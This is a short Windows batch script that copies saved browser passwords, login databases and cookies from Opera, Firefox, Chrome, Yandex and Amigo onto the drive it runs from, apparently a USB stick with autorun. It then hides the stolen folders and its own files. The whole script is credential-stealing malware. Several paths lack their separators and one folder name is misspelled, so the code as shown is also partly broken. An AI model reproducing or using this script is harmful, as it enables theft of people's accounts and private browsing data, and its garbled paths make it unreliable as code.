@echo off 
md %~d0Mozilla 
md %~d00pera 
md %~d0Google 
md %~d0Yandex 
md %~d0Amigo
CD/D %APPDATA%OperaOpera 
cls
copy /y wand.dat %~d0Opera 
copy /y cookies.dat %~d0Opera
cd %AppData%MozillaFirefoxProfiles\*.default
copy /y cookies.sqlite %~d0Mozilla
copy /y key3.db %~d0Mozilla
copy /y signons.sqlite %~d0Mozilla
copy /y %AppData%MozillaFirefoxProfiles\*.default %~d0Mozilla
cd %localappdata%GoogleChromeUser DataDefault
cls
copy /y "%localappdata%GoogleChromeUser DataDefaultLogin Data" "%~d0Google"
cd %localappdata%YandexYandexBrowserUser DataDefault
copy /y "%localappdata%YandexYandexBrowserUser DataDefaultLogin Data" "%~d0Yandex" 
cd %localappdata%AmigoUser DataDefault
copy /y "%localappdata%AmigoUser DataDefaultLogin Data" "%~d0Amigo" 
cls
ATTRIB -R -A -S -H 
attrib +h %~d0Mozilla 
attrib +h %~d0Opera 
attrib +h %~d0Google 
attrib +h %~d0Yandex 
attrib +h %~d0Amigo 
attrib +h %~d0search.bat 
attrib +h %~d0new 
attrib +h %~d0autorun.inf 
del: autorun.inf?